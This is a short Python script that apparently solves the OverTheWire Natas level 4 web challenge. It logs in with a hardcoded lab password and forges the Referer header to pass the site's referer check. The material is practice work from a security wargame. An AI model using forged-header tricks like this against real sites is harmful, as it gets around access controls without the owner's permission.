#!/bin/python
import requests

username = "natas4"
pwd = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
url = f"http://{username}.natas.labs.overthewire.org"
headers={'referer':'http://natas5.natas.labs.overthewire.org/'}
response = requests.get(url,auth=(username,pwd),headers=headers)
print(response.text)